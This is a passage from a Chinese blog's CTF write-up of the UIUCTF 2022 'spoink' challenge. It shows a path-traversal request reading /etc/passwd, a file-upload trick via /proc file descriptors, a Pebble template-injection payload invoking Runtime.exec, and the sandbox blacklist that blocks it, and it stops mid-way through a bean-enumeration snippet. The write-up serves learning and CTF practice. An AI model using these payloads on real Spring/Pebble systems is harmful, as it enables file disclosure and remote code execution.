&lt;p>&lt;a href="https://xz.aliyun.com/t/7348">Tomcat中一种半通用回显方法&lt;/a> | &lt;a href="https://xz.aliyun.com/t/7388">基于tomcat的内存 Webshell 无文件攻击技术&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.cnblogs.com/noKing/p/9038234.html">Java反射-修改字段值, 反射修改static final修饰的字段 &lt;/a>&lt;/p>
&lt;/details></description></item><item><title>Java学习笔记Ⅹ</title><link>https://amiaaaz.github.io/2022/09/07/java-study-notes-10-ctf/</link><pubDate>Wed, 07 Sep 2022 21:20:56 +0800</pubDate><guid>https://amiaaaz.github.io/2022/09/07/java-study-notes-10-ctf/</guid><description>&lt;h2 id="uiuctf-2022spoink">[UIUCTF 2022]spoink&lt;/h2>
&lt;blockquote>
&lt;p>环境：https://github.com/sigpwny/UIUCTF-2022-Public/tree/main/web/spoink&lt;/p>
&lt;p>参考wp：https://tttang.com/archive/1692/&lt;/p>
&lt;/blockquote>
&lt;h3 id="debug准备">debug准备&lt;/h3>
&lt;p>修改docker-compose.yml，增加debug port&lt;/p>
&lt;p>修改Dockerfile最后启动的CMD命令&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-dockerfile" data-lang="dockerfile">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">CMD&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;java&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;-jar&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:8881&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;/usr/src/app/spoink-0.0.1-SNAPSHOT-spring-boot.jar&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>把jar包拖出来，以zip解压，idea打开项目，添加Remote JVM Debug的debug配置项&lt;/p>
&lt;p>起容器，看pom.xml，找到mainClass和Controller，下断点并打开调试&lt;/p>
&lt;h3 id="目录穿越">目录穿越&lt;/h3>
&lt;p>整个java web项目只有一个controller&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Controller&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HomeController&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">HomeController&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@RequestMapping&lt;/span>&lt;span style="color:#f92672">({&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getTemplate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#75af00">@RequestParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;x&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">Optional&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">template&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Model&lt;/span> &lt;span style="color:#111">model&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">template&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">orElse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;home.pebble&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我第一眼看的时候以为是 传入的&lt;code>x&lt;/code>参数内容会被pebble模板渲染(SSTI)，仔细看了下发现是我思维定势了，其实是根据参数&lt;code>x&lt;/code>的内容返回指定模板String（可能有LFI），而配环境的时候我们知道flag是需要执行./getflag的，所以最后还需要rce&lt;/p>
&lt;p>注意到application.properties有pebble的配置，没有设置后缀suffix&lt;/p>
&lt;pre tabindex="0">&lt;code>pebble.prefix = templates
pebble.suffix =
&lt;/code>&lt;/pre>&lt;p>打断点（这里直接断不好断，它调用完pebble相关的库之后不会留在调用栈里，直接就到了spring）&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220907100712037.png" alt="image-20220907100712037">&lt;/p>
&lt;p>在com.mitchellbosecke.pebble.loader.FileLoader#getFile处有路径拼接的地方，对templateName无过滤拼到&lt;code>templates/&lt;/code>后面，可以目录穿越（没有设置后缀的原因）&lt;/p>
&lt;pre tabindex="0">&lt;code>/?x=../../../../../../../../../../../etc/passwd
&lt;/code>&lt;/pre>&lt;h3 id="文件上传">文件上传&lt;/h3>
&lt;p>但是flag需要rce才能读到，我们考虑上传带有恶意内容的模板文件到服务器，结合这个LFI进行rce；如何上传文件呢？由于题目用到了spring mvc（内含tomcat），框架本身是支持文件上传功能的&lt;/p>
&lt;p>在org.springframework.web.servlet.DispatcherServlet#doDispatch中有处理表单请求的地方&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220907103238423.png" alt="image-20220907103238423">&lt;/p>
&lt;p>可以看到最后调用到org.apache.catalina.connector.Request#getParts去解析内容，这部分tomcat文件上传流量层面的东西Y4师傅已经研究过了（非常非常强！）-&amp;gt;&lt;a href="https://y4tacker.github.io/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/">探寻Tomcat文件上传流量层面绕waf新姿势&lt;/a> | &lt;a href="https://y4tacker.github.io/2022/06/21/year/2022/6/%E6%8E%A2%E5%AF%BBJava%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2waf%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%B3%BB%E5%88%97%E4%BA%8C/">探寻Java文件上传流量层面waf绕过姿势系列二&lt;/a>&lt;/p>
&lt;p>类似php，这里上传文件会被保存到一个临时目录再复制到目标文件夹，起初路径在javax.servlet.MultipartConfigElement#getLocation中获取，默认为空，会使后面的location从javax.servlet.context.tempdir中获取&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220907105829293.png" alt="image-20220907105829293">&lt;/p>
&lt;p>是一个随机生成的文件夹，甚至最后的文件名也是靠getUniqueId生成的，无法爆破&lt;/p>
&lt;p>但是得益于linux下的文件描述符，我们可以爆破它；甚至于因为题目处于docker环境之下，我们可以直接冲&lt;code>/proc/1/fd/$X$&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>curl --limit-rate 1k -X POST http://10.10.1.100:8882 -F &amp;#34;file=@/tmp/1.txt&amp;#34;
&lt;/code>&lt;/pre>&lt;p>*但是我这里因为环境问题总是爆不出来？用&lt;code>/proc/1&lt;/code>是不行的 emmmmm暂时不清楚原因&lt;/p>
&lt;h3 id="模板注入">模板注入&lt;/h3>
&lt;p>之后就是pebble模板注入的事情了，但是目标环境是最新版的，修复了之前的问题&lt;/p>
&lt;p>测试payload（文件名t1）&lt;/p>
&lt;pre tabindex="0">&lt;code>{% set cmd = &amp;#39;id&amp;#39; %}
{% set bytes = (1).TYPE
.forName(&amp;#39;java.lang.Runtime&amp;#39;)
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName(&amp;#39;java.lang.String&amp;#39;)
.constructors[0]
.newInstance(([bytes]).toArray()) }}
&lt;/code>&lt;/pre>&lt;p>报错&lt;/p>
&lt;pre tabindex="0">&lt;code>com.mitchellbosecke.pebble.error.ClassAccessException: For security reasons access to public static java.lang.Class java.lang.Class.forName(java.lang.String) throws java.lang.ClassNotFoundException method is denied. (t1:3)
at com.mitchellbosecke.pebble.attributes.MemberCacheUtils.verifyUnsafeMethod(MemberCacheUtils.java:180) ~[pebble-3.1.5.jar!/:na]
at com.mitchellbosecke.pebble.attributes.MemberCacheUtils.findMethod(MemberCacheUtils.java:149) ~[pebble-3.1.5.jar!/:na]
at com.mitchellbosecke.pebble.attributes.MemberCacheUtils.reflect(MemberCacheUtils.java:89) ~[pebble-3.1.5.jar!/:na]
at com.mitchellbosecke.pebble.attributes.MemberCacheUtils.cacheMember(MemberCacheUtils.java:31) ~[pebble-3.1.5.jar!/:na]
at com.mitchellbosecke.pebble.attributes.DefaultAttributeResolver.resolve(DefaultAttributeResolver.java:63) ~[pebble-3.1.5.jar!/:na]
at com.mitchellbosecke.pebble.node.expression.GetAttributeExpression.evaluate(GetAttributeExpression.java:82) ~[pebble-3.1.5.jar!/:na]
at com.mitchellbosecke.pebble.node.expression.GetAttributeExpression.evaluate(GetAttributeExpression.java:61) ~[pebble-3.1.5.jar!/:na]
at com.mitchellbosecke.pebble.node.expression.GetAttributeExpression.evaluate(GetAttributeExpression.java:61) ~[pebble-3.1.5.jar!/:na]
at com.mitchellbosecke.pebble.node.expression.GetAttributeExpression.evaluate(GetAttributeExpression.java:61) ~[pebble-3.1.5.jar!/:na]
at com.mitchellbosecke.pebble.node.expression.GetAttributeExpression.evaluate(GetAttributeExpression.java:61) ~[pebble-3.1.5.jar!/:na]
at com.mitchellbosecke.pebble.node.expression.GetAttributeExpression.evaluate(GetAttributeExpression.java:61) ~[pebble-3.1.5.jar!/:na]
at com.mitchellbosecke.pebble.node.expression.GetAttributeExpression.evaluate(GetAttributeExpression.java:61) ~[pebble-3.1.5.jar!/:na]
at com.mitchellbosecke.pebble.node.SetNode.render(SetNode.java:31) ~[pebble-3.1.5.jar!/:na]
at com.mitchellbosecke.pebble.node.BodyNode.render(BodyNode.java:43) ~[pebble-3.1.5.jar!/:na]
at com.mitchellbosecke.pebble.node.RootNode.render(RootNode.java:30) ~[pebble-3.1.5.jar!/:na]
at com.mitchellbosecke.pebble.template.PebbleTemplateImpl.evaluate(PebbleTemplateImpl.java:157) ~[pebble-3.1.5.jar!/:na]
at com.mitchellbosecke.pebble.template.PebbleTemplateImpl.evaluate(PebbleTemplateImpl.java:105) ~[pebble-3.1.5.jar!/:na]
at com.mitchellbosecke.pebble.spring.servlet.PebbleView.evaluateTemplate(PebbleView.java:86) ~[pebble-spring5-3.1.5.jar!/:na]
at com.mitchellbosecke.pebble.spring.servlet.PebbleView.renderMergedTemplateModel(PebbleView.java:61) ~[pebble-spring5-3.1.5.jar!/:na]
&lt;/code>&lt;/pre>&lt;p>报错method is denied，下面列出来的都是denied。。。。看一下调用栈，模板在com.mitchellbosecke.pebble.node.expression.GetAttributeExpression#evaluate处被处理，从后往前处理函数内容，起到限制的函数是com.mitchellbosecke.pebble.attributes.methodaccess.BlacklistMethodAccessValidator#isMethodAccessAllowed&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">BlacklistMethodAccessValidator&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">MethodAccessValidator&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">FORBIDDEN_METHODS&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;getClass&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;wait&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;notify&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;notifyAll&amp;#34;&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">BlacklistMethodAccessValidator&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">isMethodAccessAllowed&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">object&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">methodForbidden&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">object&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">object&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Runtime&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">object&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Thread&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">object&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">ThreadGroup&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">object&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">System&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">object&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">AccessibleObject&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isUnsafeMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">methodForbidden&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">isUnsafeMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">member&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAnyOfMethods&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">member&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">FORBIDDEN_METHODS&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">isAnyOfMethods&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">member&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">...&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">var3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">var4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">var5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">var5&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">var4&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">var3&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isMethodWithName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">member&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">isMethodWithName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">member&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">member&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="beans到classloader">beans到classLoader&lt;/h3>
&lt;p>spring框架中许多实例都隐式注册为bean，因此我们思考能否从bean中找到一个保存了classloader的对象，再从它调用loadClass来加载任意对象&lt;/p>
&lt;p>那我们看看程序的上下文，pebble初始化是在com.mitchellbosecke.pebble.template.PebbleTemplateImpl#evaluate(java.io.Writer, java.util.Map&amp;lt;java.lang.String,java.lang.Object&amp;gt;, java.util.Locale)中&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220907165851990.png" alt="image-20220907165851990">&lt;/p>
&lt;p>向上看代码，这里获取了spring的应用程序上下文并添加到beans属性中&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220907171114591.png" alt="image-20220907171114591">&lt;/p>
&lt;p>写一个路由用来遍历&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@RequestMapping&lt;/span>&lt;span style="color:#f92672">({&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getTemplate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#75af00">@RequestParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;x&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">Optional&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">template&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Model&lt;/span> &lt;span style="color:#111">model&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ServletContext&lt;/span> &lt;span style="color:#111">sss&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">ServletRequestAttributes&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">RequestContextHolder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRequestAttributes&lt;/span>&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#75af00">getRequest&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getSession&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getServletContext&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">org&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">springframework&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">web&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">WebApplicationContext&lt;/span> &lt;span style="color:#111">context&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">org&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">springframework&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">web&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">support&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">WebApplicationContextUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getWebApplicationContect&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">sss&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">beanDefinitionNaems&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBeanDefinitionNames&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">beanDefinitionNames&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
